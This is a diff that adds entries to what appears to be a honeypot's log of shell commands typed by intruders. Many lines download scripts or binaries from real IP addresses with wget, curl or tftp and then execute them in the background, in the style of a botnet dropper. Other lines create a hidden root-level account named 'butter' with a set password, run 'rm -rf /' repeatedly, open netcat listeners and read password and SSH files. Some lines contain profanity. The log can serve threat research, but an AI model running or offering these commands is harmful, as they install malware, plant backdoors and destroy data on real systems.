@@ -1,3 +1,155 @@
+echo -e test
+`id`
+id
+echo `id`
+echo "hello honeypot, and  the important thing is i want fuck you!"
+exit
+python
+rm /var -rf
+ls
+ls /
+cd /
+rm / -rf
+ls
+rm -rf /
+while
+rm -rf /
+rm -rf /
+rm -rf /rm -rf /
+rm -rf /
+rm -rf /
+clear
+ls -al
+ls -al
+cat .bashrc 
+wget 123
+wget -O- http://sb.com
+uname -m
+uname -r
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter
+echo "xuelp123"|passwd --stdin butter
+echo butter:xuelp123|chpasswd
+id -u
+curl -o /tmp/g251 http://23.234.25.140:15826/g251
+curl -o /tmp/g251 http://23.234.25.140:15826/g251
+curl -o /tmp/g251 http://23.234.25.140:15826/g251
+cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget http://208.67.1.5/kek0xbin.sh; chmod 777 kek0xbin.sh; sh kek0xbin.sh; rm -rf kek0xbin.sh; tftp -r kek0xt1.sh -g 208.67.1.5; sh kek0xt1.sh; tftp 208.67.1.5 -c get kek0xt2.sh; sh kek0xt2.sh; rm -rf kek0xbin.sh kek0xt1.sh kek0xt2.sh
+cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget http://208.67.1.5/kek0xbin.sh; chmod 777 kek0xbin.sh; sh kek0xbin.sh; rm -rf kek0xbin.sh; tftp -r kek0xt1.sh -g 208.67.1.5; sh kek0xt1.sh; tftp 208.67.1.5 -c get kek0xt2.sh; sh kek0xt2.sh; rm -rf kek0xbin.sh kek0xt1.sh kek0xt2.sh
+id
+ls
+wpd
+wegt http://59.46.12.138:5555/sh
+wget http://59.46.12.138:5555/sh
+chmod 777 sh
+./sh
+chmod a+x sh
+chmod 0777 sh
+./sh
+wget http://59.46.12.138:5555/sh
+chmod 777 sh
+./sh
+chmod 777 sh
+./sh
+exit
+ls -al
+history
+echo -n test
+nestat -ano
+netstat -n test
+w
+last
+ps -al
+cd /tmp
+ls -al
+nc -lvp 2333
+apt-get install nc
+nc -lvp 2333
+nc -lp 2333
+exit
+history
+nc -l
+nc -lvp 2333
+echo -n test1234
+echo 123
+ls -al
+cat .ssh
+cd .ssh/
+ls -al
+cat known_hosts 
+cd 
+ls -al
+cd /
+ls -al
+cd home
+ls -al
+cd richard/
+ls -al
+apt-get install socat
+socat -h
+ls -al
+cd ..
+cd ..
+ls -al
+history 
+exit
+history
+yum install nc
+apt-get install cowsay
+cowsay
+s
+cat /etc/passwd
+mail root
+mail
+ls /
+ls -al /
+cat /proc/cpu
+cat /proc/cpuinfo
+fuck you
+ipconfig
+ifconfig
+ifconfig -al
+ls
+rm /tmp/ -rf
+rm /proc/ -rf
+ls /
+netstat -tlanp
+ps -aux|grep watchdog
+cat /etc/passwd
+passwd
+su richard
+adduser
+useradd
+adduser aaa
+vi /etc/passwd
+vim
+nano
+ls -al
+cd .ssh/
+ls
+ls -al
+cat known_hosts 
+cat known_hosts 
+exit
+exit
+exit
+;s
+ls
+pwd
+wget http://123.1.169.48/aa
+ls
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+wget http://123.1.169.48
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+chmod 0755 aa
+nohup /root/aa > /dev/null 2>&1 &
+ls
+nohup /root/aa > /dev/null 2>&1 &
+nohup /root/aa > /dev/null 2>&1 &
+nohup /root/aa > /dev/null 2>&1 &
 curl -o /tmp/g251 http://23.234.25.140:15826/g251
 curl -o /tmp/g251 http://23.234.25.140:15826/g251
 curl -o /tmp/g251 http://23.234.25.140:15826/g251
@@ -184,21 +336,3 @@ nohup /root/333 > /dev/null 2>&1 &
 wget http://115.231.218.31:888/222
 nohup /root/222 > /dev/null 2>&1 &
 cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; rm -f *; wget http://199.180.134.199/bin.sh; sh bin.sh; rm -rf bin.sh; tftp -r tftp1.sh -g 199.180.134.199; sh tftp1.sh; tftp 199.180.134.199 -c get tftp2.sh; sh tftp2.sh; rm -rf bin.sh tftp1.sh tftp2.sh
-;s
-ls
-pwd
-wget http://123.1.169.48/aa
-ls
-wget http://123.1.169.48/aa
-wget http://123.1.169.48/aa
-wget http://123.1.169.48/aa
-wget http://123.1.169.48
-wget http://123.1.169.48/aa
-wget http://123.1.169.48/aa
-wget http://123.1.169.48/aa
-chmod 0755 aa
-nohup /root/aa > /dev/null 2>&1 &
-ls
-nohup /root/aa > /dev/null 2>&1 &
-nohup /root/aa > /dev/null 2>&1 &
-nohup /root/aa > /dev/null 2>&1 &
